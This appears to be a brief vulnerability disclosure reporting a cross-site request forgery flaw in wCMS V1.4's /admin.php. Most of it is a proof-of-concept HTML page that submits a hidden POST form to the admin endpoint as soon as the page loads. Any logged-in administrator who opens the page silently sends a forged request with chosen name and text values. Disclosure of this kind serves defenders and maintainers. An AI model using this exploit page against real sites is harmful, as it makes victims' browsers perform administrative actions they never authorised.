
target:https://github.com/wCMS/wCMS
version: V1.4

wCMS V1.4 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component  /admin.php

POC:
```
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://192.168.31.101/admin.php" method="POST">
      <input type="hidden" name="submit" value="1" />
      <input type="hidden" name="name" value="CSRF" />
      <input type="hidden" name="text" value="CSRF" />
    </form>
  </body>
</html>
```

